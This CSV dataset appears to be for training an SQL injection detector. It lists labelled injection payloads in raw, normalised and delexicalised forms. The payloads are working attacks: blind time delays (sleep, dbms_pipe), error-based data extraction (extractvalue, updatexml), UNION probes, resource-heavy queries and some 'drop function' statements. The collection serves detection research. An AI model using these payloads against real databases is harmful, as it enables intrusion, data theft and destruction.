payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,select ( case when ( 5203 = 6330 ) then 5203 else 5203* ( select 5203 from mysql.db ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from mysql.db ) end ) #,1,False,,sqli_dataset
1'||  (  select 'lmsc' from dual where 1162  =  1162 order by 1--,1'|| ( select 'lmsc' from dual where 1162 = 1162 order by 1--,<NUM><STR>lmsc' from dual where <NUM> = <NUM> order by <NUM>--,1,False,,sqli_dataset
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""bhmu"" like ""bhmu","select count ( * ) from generate_series ( 1,5000000 ) and ( ( ""bhmu"" like ""bhmu","select count ( * ) from generate_series ( <NUM>,<NUM> ) and ( ( <STR> like ""bhmu",1,False,,sqli_dataset
"-6357""  )   order by 1--","-6357"" ) order by 1--","-<NUM>"" ) order by <NUM>--",1,False,,sqli_dataset
"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""zptu""  =  ""zptu","1"" ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""zptu"" = ""zptu",<NUM><STR>zptu<STR>zptu,1,False,,sqli_dataset
"1 and make_set  (  9681  =  4703,4703  )  # zbrf","1 and make_set ( 9681 = 4703,4703 ) # zbrf","<NUM> and make_set ( <NUM> = <NUM>,<NUM> ) # zbrf",1,False,,sqli_dataset
"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1' ) as sjzi where 8242 = 8242 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>' ) as sjzi where <NUM> = <NUM> and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
1'+  (  select rhlb where 9477  =  9477,1'+ ( select rhlb where 9477 = 9477,<NUM>'+ ( select rhlb where <NUM> = <NUM>,1,True,,sqli_dataset
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""%""  =  ""","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ""%"" = ""","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( <STR> = """,1,False,,sqli_dataset
"-2216""  )   where 6692  =  6692 union all select 6692,6692,6692#","-2216"" ) where 6692 = 6692 union all select 6692,6692,6692#","-<NUM>"" ) where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',-6397%' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and '%' = ',-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'  )   as afnt where 4719  =  4719 and elt  (  8224  =  1275,1275  )  --","1' ) as afnt where 4719 = 4719 and elt ( 8224 = 1275,1275 ) --","<NUM>' ) as afnt where <NUM> = <NUM> and elt ( <NUM> = <NUM>,<NUM> ) --",1,False,,sqli_dataset
1'   )    )    as rxxd where 5049  =  5049,1' ) ) as rxxd where 5049 = 5049,<NUM>' ) ) as rxxd where <NUM> = <NUM>,1,False,,sqli_dataset
"1'+  (  select sxco where 1623  =  1623 union all select null,null--","1'+ ( select sxco where 1623 = 1623 union all select null,null--","<NUM>'+ ( select sxco where <NUM> = <NUM> union all select null,null--",1,True,,sqli_dataset
"1"" where 4978  =  4978 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1"" where 4978 = 4978 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>"" where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,False,,sqli_dataset
1' where 3188  =  3188 and 9198  =  9198--,1' where 3188 = 3188 and 9198 = 9198--,<NUM>' where <NUM> = <NUM> and <NUM> = <NUM>--,1,False,,sqli_dataset
"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#","1'+ ( select 'eoxk' where 6621 = 6621 union all select null,null#","<NUM><STR>eoxk' where <NUM> = <NUM> union all select null,null#",1,True,,sqli_dataset
1  )   as qywz where 1864  =  1864 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1 ) as qywz where 1864 = 1864 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,<NUM> ) as qywz where <NUM> = <NUM> and <NUM> in ( ( char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) ) --,1,True,,sqli_dataset
"1""   )    )    union all select null,null--","1"" ) ) union all select null,null--","<NUM>"" ) ) union all select null,null--",1,False,,sqli_dataset
"1 where 2988  =  2988 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","1 where 2988 = 2988 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM> where <NUM> = <NUM> or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,False,,sqli_dataset
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'mseo' like 'mseo","1' ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'mseo' like 'mseo",<NUM><STR>mseo<STR>mseo,1,False,,sqli_dataset
"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""vlev"" like ""vlev","1"" ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""vlev"" like ""vlev",<NUM><STR>vlev<STR>vlev,1,True,,sqli_dataset
1'+  (  select 'rkap' where 9692  =  9692,1'+ ( select 'rkap' where 9692 = 9692,<NUM><STR>rkap' where <NUM> = <NUM>,1,True,,sqli_dataset
"1%'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   '%'  =  '","1%' ) ) and elt ( 4249 = 4249,7259 ) and ( ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1""   )    )    as qejm where 9014  =  9014 union all select null,null,null,null,null,null#","1"" ) ) as qejm where 9014 = 9014 union all select null,null,null,null,null,null#","<NUM>"" ) ) as qejm where <NUM> = <NUM> union all select null,null,null,null,null,null#",1,False,,sqli_dataset
-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,-9556' ) where 2472 = 2472 or ( 2883 = 9968 ) *9968--,-<NUM>' ) where <NUM> = <NUM> or ( <NUM> = <NUM> ) *<NUM>--,1,False,,sqli_dataset
1  )   as nxmd where 8650  =  8650,1 ) as nxmd where 8650 = 8650,<NUM> ) as nxmd where <NUM> = <NUM>,1,False,,sqli_dataset
-8812 or 6872  =  6872# dflr,-8812 or 6872 = 6872# dflr,-<NUM> or <NUM> = <NUM># dflr,1,False,,sqli_dataset
1%' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',1%' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and '%' = ',<NUM>%<STR>qqpjq<STR>qzvzq<STR>%<STR>,1,False,,sqli_dataset
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'iaud'  =  'iaud","1' ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'iaud' = 'iaud",<NUM><STR>iaud<STR>iaud,1,False,,sqli_dataset
1 and   (  3020  =  3020  )  *6703-- zsnl,1 and ( 3020 = 3020 ) *6703-- zsnl,<NUM> and ( <NUM> = <NUM> ) *<NUM>-- zsnl,1,False,,sqli_dataset
1   )    )    as rhwg where 8843  =  8843,1 ) ) as rhwg where 8843 = 8843,<NUM> ) ) as rhwg where <NUM> = <NUM>,1,False,,sqli_dataset
-2495   )    )    as hudw where 4197  =  4197 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,-2495 ) ) as hudw where 4197 = 4197 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,-<NUM> ) ) as hudw where <NUM> = <NUM> or <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) --,1,False,,sqli_dataset
"-9697  )   union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--","-9697 ) union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--","-<NUM> ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"-4068'   )    )     )   union all select 9491,9491,9491--","-4068' ) ) ) union all select 9491,9491,9491--","-<NUM>' ) ) ) union all select <NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1%""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1%"" ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM>%"" ) ) ) or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
"elt  (  5098  =  2728,1  )","elt ( 5098 = 2728,1 )","elt ( <NUM> = <NUM>,<NUM> )",1,False,,sqli_dataset
1' where 7882  =  7882 and 6663  =  4524--,1' where 7882 = 7882 and 6663 = 4524--,<NUM>' where <NUM> = <NUM> and <NUM> = <NUM>--,1,False,,sqli_dataset
"1%""   )    )     )   union all select null,null,null--","1%"" ) ) ) union all select null,null,null--","<NUM>%"" ) ) ) union all select null,null,null--",1,False,,sqli_dataset
"1""   )    )    as bosq where 4695  =  4695","1"" ) ) as bosq where 4695 = 4695","<NUM>"" ) ) as bosq where <NUM> = <NUM>",1,False,,sqli_dataset
"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#","-6463"" ) ) ) union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#","-<NUM>"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1'   )    )    as nlfq where 3410  =  3410 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --","1' ) ) as nlfq where 3410 = 3410 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --","<NUM>' ) ) as nlfq where <NUM> = <NUM> or extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ) --",1,True,,sqli_dataset
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'ylql' like 'ylql","1' ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 'ylql' like 'ylql",<NUM><STR>ylql<STR>ylql,1,False,,sqli_dataset
if  (  3593  =  3779  )   select 3593 else drop function qtqy--,if ( 3593 = 3779 ) select 3593 else drop function qtqy--,if ( <NUM> = <NUM> ) select <NUM> else drop function qtqy--,1,False,,sqli_dataset
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   8535  =  8535","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( 8535 = 8535","select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( <NUM> = <NUM>",1,False,,sqli_dataset
if  (  8995  =  9787  )   select 8995 else drop function ofgg--,if ( 8995 = 9787 ) select 8995 else drop function ofgg--,if ( <NUM> = <NUM> ) select <NUM> else drop function ofgg--,1,False,,sqli_dataset
"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq","1"" ) rlike sleep ( 5 ) and ( ""efoq"" like ""efoq",<NUM><STR>efoq<STR>efoq,1,False,,sqli_dataset
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi","1' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'pydi' like 'pydi",<NUM><STR>pydi<STR>pydi,1,True,,sqli_dataset
"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'","1'+ ( select sshu where 3442 = 3442 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +'",<NUM><STR>,1,True,,sqli_dataset
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec","select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'inec' = 'inec","select like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) and ( <STR> = 'inec",1,False,,sqli_dataset
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   '%'  =  ',( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( '%' = ',( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and ( ( <STR> = ',1,False,,sqli_dataset
"1""  )   as jscj where 2308  =  2308 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1"" ) as jscj where 2308 = 2308 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>"" ) as jscj where <NUM> = <NUM> or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,False,,sqli_dataset
"1%'   )    )    and make_set  (  6527  =  9529,9529  )   and    (    (   '%'  =  '","1%' ) ) and make_set ( 6527 = 9529,9529 ) and ( ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1 where 5401  =  5401 and elt  (  1210  =  1210,sleep  (  5   )    )   --","1 where 5401 = 5401 and elt ( 1210 = 1210,sleep ( 5 ) ) --","<NUM> where <NUM> = <NUM> and elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) --",1,False,,sqli_dataset
"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '","1%' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1%""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""%""  =  ""","1%"" ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr","1"" ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ""vdyr"" = ""vdyr",<NUM><STR>vdyr<STR>vdyr,1,True,,sqli_dataset
1'  )   and 4380  =  5851 and   (  'cxcl'  =  'cxcl,1' ) and 4380 = 5851 and ( 'cxcl' = 'cxcl,<NUM><STR>cxcl<STR>cxcl,1,False,,sqli_dataset
-6757'   )    )     )   or 4524  =  3696,-6757' ) ) ) or 4524 = 3696,-<NUM>' ) ) ) or <NUM> = <NUM>,1,False,,sqli_dataset
"1  )   where 4810  =  4810 union all select null,null#","1 ) where 4810 = 4810 union all select null,null#","<NUM> ) where <NUM> = <NUM> union all select null,null#",1,False,,sqli_dataset
-6586'   )    )    or 2021  =  2996,-6586' ) ) or 2021 = 2996,-<NUM>' ) ) or <NUM> = <NUM>,1,False,,sqli_dataset
"-4100'   )    )    union all select 1163,1163,1163--","-4100' ) ) union all select 1163,1163,1163--","-<NUM>' ) ) union all select <NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--","-2216 ) ) as hxmq where 5677 = 5677 union all select 5677,5677--","-<NUM> ) ) as hxmq where <NUM> = <NUM> union all select <NUM>,<NUM>--",1,False,,sqli_dataset
"1%""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  ""","1%"" ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --","1' ) where 7887 = 7887 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --","<NUM>' ) where <NUM> = <NUM> and updatexml ( <NUM>,concat ( 0x2e,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ,<NUM> ) --",1,True,,sqli_dataset
